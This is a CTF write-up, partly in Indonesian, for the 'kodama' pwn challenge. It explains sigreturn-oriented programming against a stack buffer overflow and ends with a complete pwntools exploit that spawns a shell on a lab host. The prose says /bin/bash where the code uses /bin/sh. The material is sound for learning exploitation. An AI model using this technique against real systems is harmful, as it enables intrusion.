---
slug: "pwn-kodama"
title: "kodama"
competition: "PlayITPlus"
category: "Pwn"
difficulty: "Medium"
date: "2026-11-08"
updated: "2026-11-09"
summary: "Sigreturn Oriented Programming (SROP) challenge, but it's easier cuz in the binary have the /bin/bash string. So we doesn't have to input the /bin/bash at .bss."
tags: ["SROP","BUFFER OVERFLOW","SYSCALL","LINUX"]
status: "published"
flag: "PLAYITPLUS{5fdf16138ae47bbdb843f79e0f966bd1b047ec4d42707250ad1e4a6857472ec4}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-kodama"
---

# kodama

> Sigreturn Oriented Programming (SROP) challenge, but it's easier cuz in the binary have the /bin/bash string. So we doesn't have to input the /bin/bash at .bss.

![1794213639235187297.png](/assets/uploads/f6774b88-42fa-4cca-976c-b8625329aa98-1794213639235187297.png)

## TL;DR

SROP

### AI (not really useful, i can solve this within minute but i want the firstblood faster hehe)

[https://chat.deepseek.com/share/vowtyiuy0r0pv4iyh4](https://chat.deepseek.com/share/vowtyiuy0r0pv4iyh4)

## Challenge

-   **Poin / solves:** 460 / 14
    
-   **Deskripsi:** kodama is listening in the valley.
    

## Recon

firstly kita checksec, ternyata semua proteksi mati kecuali NX, jadinya ngga bisa langsung shellcode.

```bash
~/ctf/playit/pwn/kodama
❯ checksec kodama                                                               󰥔 09:01:11
[*] '/home/claritys/ctf/playit/pwn/kodama/kodama'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

## Vulnerability

Setelah kita decompile, yang penting adalah ini:

```
//----- (0000000000401010) ----------------------------------------------------
signed __int64 vuln()
{
  char buf[72]; // [rsp+0h] [rbp-48h] BYREF

  return sys_read(0, buf, 0x200u);
}

//----- (0000000000401030) ----------------------------------------------------
void __noreturn start()
{
  sys_write(1u, "kodama is listening. speak into the valley.\n> ", 0x2Eu);
  vuln();
  sys_exit(0);
}
```

karena dia memakai `sys`, jadi aku langsung search digoogle WU WU tentangnya.

## Exploit plan

Aku dapet referensi ini:

-   [https://sharkmoos.medium.com/a-quick-demonstration-of-sigreturn-oriented-programming-d9ae98c3ab0e](https://sharkmoos.medium.com/a-quick-demonstration-of-sigreturn-oriented-programming-d9ae98c3ab0e)
    
-   [https://github.com/utisss/foreverctf-writeups/blob/master/pwn-srop.md](https://github.com/utisss/foreverctf-writeups/blob/master/pwn-srop.md)
    
-   [https://docs.pwntools.com/en/stable/rop/srop.html](https://docs.pwntools.com/en/stable/rop/srop.html)
    

Aku tau ini itu chall **srop** based on pengalaman juga sih, tapi sempet ngira kalau ini ret2syscall sebentar doang karena sebelumnya sering ngerjain chall ret2syscall.

(Biar diinilai sigma WU nya) Before we ngerakit payloadnya, I think lebih baik kita jelaskan dulu deh `srop` itu apa.

So basically `srop` itu dia ngemodify function lain jadi function yang kita mau, sama juga dengan `ret2syscall`. Almost looks alike with `ret2syscall` the concept is the same, but the execution aren’t the same.

How? Firstly, we must understand how `syscall` works and how `function` called in `Linux Architecture`. We can see it at this website:

-   [https://syscall.sh/x64/](https://syscall.sh/x64/)
    

The website give us what is the value that needed to call a function like `read, write open`.

![image.png](/assets/uploads/ae71e611-bd46-42ae-b28e-be5536db16c7-image.png)

Bisa kita lihat kalau ada argumen argumen yang diperlukan untuk memanggil sebuah function. Diantara lain adalah: `rdi, rsi, rdx, r10, r8, dan r9`. But some of the program usually use only 3 argument: `rdi, rsi, and rdx`.

Let’s give it an example, i take `read` as an example for this one:

![image.png](/assets/uploads/406435ed-e223-4218-8109-c919456b7bdd-image-1.png)

> Function read butuh `rdi, rsi, dan rdx` buat successfuly memanggil dia. Nah do you get the catch? How Linux membedakan function padahal diprogramnya itu nggak ada ‘`NAME`' kayak gitu? Jawabannya ada di `RAX`. Yang di mana, untuk case `read` itu kita pakai hex `0x0` untuk memanggil `read`, jadi kita harus ngeganti value `RAX` nya menjadi `0x` biar function `read` kepanggil.

Jadi kesimpulannya adalah, kita bisa pake trick ini untuk memanggil function yang kita mau. Target kita adalah `exec`, yang di mana kita nanti jadikan dia bisa ngeeksekusi `/bin/bash` biar kita dapet `shell`.

![image.png](/assets/uploads/a3eeec3a-f122-42f2-a0de-a20c8227f2db-image-2.png)

Dapat kita lihat disitu kalau `hex`nya adalah `0x3b`, jadi kita harus ganti `RAX`nya menjadi `0x3b`. Lalu kita isi `rdi` dengan `/bin/bash`. Kebetulan di chall ini ada `/bin/bash` di dalam filenya, jadi ngga usah repot repot naruh `/bin/bash` di `.bss`.

```python
~/ctf/playit/pwn/kodama
❯ strings -a -t x kodama | grep /bin/sh                                         󰥔 22:36:23
   3000 /bin/sh
```

Lalu untuk value yang lainnya kayak `rsi` dan `rdx` itu kita isi dengan `0` aja gapapa, karena belum berguna.

Okay that only the explanation for the `syscall`. Now for the `srop` explanation.

`SROP` is the `S` stands for `Sigreturn`, when did you saw like `Sig*`? Yup, when the program error or broken in the inside. So the `SROP` have a function named `rt_sigreturn` yang di mana ketika error atau broken, kita nggak crash terus stop, namun dia akan menjalankan `rt_sigreturn`, yang di mana kita bisa mengatur dia itu ngeeksekusi function apa.

Seharusnya kalau si program memang ada `rt_sigreturn` by default, seharusnya dia itu bakal diarahin ke function yang dimau sama programmer. Tapi gimana cara `rt_sigreturn`dia ini memilih frame kayak `rdi, rsi, rdx, r10, r8 dan r9`? Yaitu dari rsp, yang di mana seharusnya kan kita ngga bisa exploit, tapi sekarang kita bisa. Jadinya si program nggak tau kalau yang ada di rsp itu adalah modified dari kita biar mendapatkan function yang kita mau.

Kita ngga usah repot repot kayak nyari cara buat naruh value mereka di sana, karena di pwntools ada yang namanya `SigreturnFrame()`, dialah yang mencari cara biar bisa jalan nanti proses `rt_sigreturn` sesuai function yang kita mau.

Jadi kita bisa membuat si program memanggil `rt_sigreturn` karena ada `pop rax` dan `syscall` untuk ngeeksekusi `rt_sigreturn`:

```python
~/ctf/playit/pwn/kodama
❯ ropper --file kodama_patched --search "pop"                                   󰥔 23:00:40
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: kodama_patched
0x0000000000401000: pop rax; ret;
```

```bash
~/ctf/playit/pwn/kodama
❯ ropper --file kodama_patched --search "syscall"                               󰥔 09:03:07
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall

[INFO] File: kodama_patched
0x0000000000401002: syscall;
0x0000000000401002: syscall; ret;
```

Baru deh kita bisa rakit payloadnya jadi kek gini:

```asm
    pop_rax = 0x401000
    syscall = 0x401002
    binsh = next(elf.search(b"/bin/sh\x00"))

    frame = SigreturnFrame()
    frame.rax = 0x3b          # execve
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall       # setelah frame dipulihkan, langsung syscall lagi

    payload = flat({
        72: [
            pop_rax,
            15,               # SYS_rt_sigreturn
            syscall,
            frame             # SigreturnFrame akan diserialisasi otomatis
        ]
    })

    r.sendline(payload)
```

Saat `syscall` pertama dieksekusi dengan `rax=15`, kernel membaca frame di stack, lalu "melompat" ke `frame.rip`. Karena `frame.rip` juga menunjuk ke `syscall`, dan saat itu `rax` sudah bernilai `0x3b`, `execve("/bin/sh", NULL, NULL)` langsung berjalan.

![image.png](/assets/uploads/85928f0b-e0f3-4a75-9f19-cbbf4f7d5462-image-3.png)

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("kodama_patched")

context.binary = elf
context.terminal = ["ghostty", "-e"]
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("10.0.2.3", 4271) 

def main():
    r = conn()

    # syscall = 0x0000000000401002
    # rax = 0x0000000000401000
    # execve = 0x3b
    # binsh = next(elf.search(b"/bin/sh\x00"))
    # payload = flat({72:[
    #     rax, execve, 
    #     binsh,
    #     syscall, ]})

    # r.sendline(payload)
    pop_rax = 0x401000
    syscall = 0x401002
    binsh = next(elf.search(b"/bin/sh\x00"))

    frame = SigreturnFrame()
    frame.rax = 0x3b          # execve
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall       # setelah frame dipulihkan, langsung syscall lagi

    payload = flat({
        72: [
            pop_rax,
            15,               # SYS_rt_sigreturn
            syscall,
            frame             # SigreturnFrame akan diserialisasi otomatis
        ]
    })

    r.sendline(payload)
    r.interactive()
    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```
